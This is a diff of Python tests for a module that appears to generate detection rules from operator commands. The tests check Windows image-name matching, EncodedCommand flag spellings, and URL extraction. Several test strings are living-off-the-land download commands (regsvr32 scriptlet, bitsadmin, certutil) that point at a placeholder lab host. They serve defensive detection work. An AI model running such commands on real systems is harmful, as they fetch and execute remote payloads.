@@ -404,3 +404,153 @@ def test_execution_bitsadmin_emits_t1197(tmp_path: Path) -> None:
         _ctx(tmp_path),
     )
     assert result.techniques == ["T1197"]
+
+
+# ---------------------------------------------------------------------------
+# Codex P1 fix: default branch image|endswith must include .exe on Windows
+# ---------------------------------------------------------------------------
+
+
+def test_default_image_match_appends_exe_for_windows_when_missing(
+    tmp_path: Path,
+) -> None:
+    """When the operator types ``powershell -c X`` (no .exe suffix),
+    the basename is ``powershell``. Real EDR / Sysmon EID 1 captures
+    ``process.image`` with the full filename (``...\\powershell.exe``);
+    a draft selecting on ``\\powershell`` would never match. The
+    default branch must append ``.exe`` for the Windows logsource."""
+
+    mod = ExecutionModule()
+    mod.update_config({})
+    result = mod.execute(
+        {"command": "powershell -nop -c Get-Date", "target_os": "windows"},
+        _ctx(tmp_path),
+    )
+    selection = result.detection_hints["detection"]["selection"]
+    assert selection["process.image|endswith"] == "\\powershell.exe"
+
+
+def test_default_image_match_does_not_double_append_exe(tmp_path: Path) -> None:
+    """If the operator already typed ``powershell.exe -c X``, the
+    basename returns ``powershell.exe`` — the draft must not become
+    ``\\powershell.exe.exe``."""
+
+    mod = ExecutionModule()
+    mod.update_config({})
+    result = mod.execute(
+        {"command": "powershell.exe -nop -c Get-Date", "target_os": "windows"},
+        _ctx(tmp_path),
+    )
+    selection = result.detection_hints["detection"]["selection"]
+    assert selection["process.image|endswith"] == "\\powershell.exe"
+
+
+def test_default_image_match_no_exe_append_on_linux(tmp_path: Path) -> None:
+    """Non-Windows logsources should not append ``.exe`` (Linux
+    process.image is just the binary name)."""
+
+    mod = ExecutionModule()
+    mod.update_config({})
+    result = mod.execute(
+        {"command": "bash -lc 'id'", "target_os": "linux"}, _ctx(tmp_path)
+    )
+    selection = result.detection_hints["detection"]["selection"]
+    assert selection["process.image|endswith"] == "\\bash"
+
+
+# ---------------------------------------------------------------------------
+# Codex P2 fix: EncodedCommand selection accepts every supported flag spelling
+# ---------------------------------------------------------------------------
+
+
+def test_encoded_command_selection_uses_contains_any_with_all_spellings(
+    tmp_path: Path,
+) -> None:
+    """The decoder accepts ``-enc`` / ``-EncodedCommand`` / ``/enc`` /
+    ``-ec`` / ``-encoded`` / ``-encode`` (long and short, ``-`` and
+    ``/`` prefix). The detection draft must cover the same spellings
+    via ``contains_any``; a hardcoded ``contains_all: ['-enc']`` would
+    miss every other supported invocation form."""
+
+    encoded = _ps_encode("Get-Process")
+    mod = ExecutionModule()
+    mod.update_config({})
+    result = mod.execute(
+        {"command": f"powershell /EncodedCommand {encoded}"}, _ctx(tmp_path)
+    )
+    selection = result.detection_hints["detection"]["selection"]
+    spellings = selection.get("process.command_line|contains_any")
+    assert spellings is not None, (
+        f"expected contains_any selection, got: {selection.keys()}"
+    )
+    expected_subset = {"-enc", "/enc", "-ec", "/ec", "-EncodedCommand", "/EncodedCommand"}
+    assert expected_subset.issubset(set(spellings)), (
+        f"missing spellings in selection: {expected_subset - set(spellings)}"
+    )
+    # And the legacy hardcoded contains_all should be gone.
+    assert "process.command_line|contains_all" not in selection
+
+
+# ---------------------------------------------------------------------------
+# Codex P2 fix: per-proxy payload extraction
+# ---------------------------------------------------------------------------
+
+
+def test_extract_proxy_target_regsvr32_pulls_url_from_i_flag() -> None:
+    """``regsvr32 /s /n /u /i:http://lab.invalid/x.sct scrobj.dll``
+    has the URL embedded in the ``/i:`` flag; the previous generic
+    ``/``-prefix skip rule would drop it entirely. The draft would
+    then anchor on ``scrobj.dll`` (always-present in real captures)
+    rather than the attacker URL."""
+
+    target = _extract_proxy_target(
+        "regsvr32 /s /n /u /i:http://lab.invalid/x.sct scrobj.dll", "regsvr32"
+    )
+    assert target == "http://lab.invalid/x.sct"
+
+
+def test_extract_proxy_target_bitsadmin_pulls_url_not_jobname() -> None:
+    """``bitsadmin /transfer myJob /download URL PATH`` - the operator
+    cares about the URL, not ``myJob``. A first-non-flag rule would
+    incorrectly return ``myJob``."""
+
+    target = _extract_proxy_target(
+        "bitsadmin /transfer myJob /download http://lab.invalid/p.exe C:\\\\t\\\\p.exe",
+        "bitsadmin",
+    )
+    assert target == "http://lab.invalid/p.exe"
+
+
+def test_extract_proxy_target_certutil_pulls_url() -> None:
+    """``certutil -urlcache -split -f URL`` has every flag-looking
+    token before the URL."""
+
+    target = _extract_proxy_target(
+        "certutil -urlcache -split -f http://lab.invalid/x.txt", "certutil"
+    )
+    assert target == "http://lab.invalid/x.txt"
+
+
+def test_extract_proxy_target_certutil_https_form() -> None:
+    target = _extract_proxy_target(
+        "certutil -urlcache -split -f https://lab.invalid/x.txt", "certutil"
+    )
+    assert target == "https://lab.invalid/x.txt"
+
+
+def test_extract_proxy_target_regsvr32_n_flag_form() -> None:
+    """The ``/n:`` flag is sometimes used in lieu of ``/i:`` for
+    fileless variants; the extractor accepts both."""
+
+    target = _extract_proxy_target(
+        "regsvr32 /s /u /n:http://lab.invalid/x.sct scrobj.dll", "regsvr32"
+    )
+    assert target == "http://lab.invalid/x.sct"
+
+
+def test_extract_proxy_target_regsvr32_falls_back_when_no_i_flag() -> None:
+    """If no ``/i:`` flag is present, regsvr32 falls back to the first
+    non-flag token (``scrobj.dll`` family)."""
+
+    target = _extract_proxy_target("regsvr32 scrobj.dll", "regsvr32")
+    assert target == "scrobj.dll"
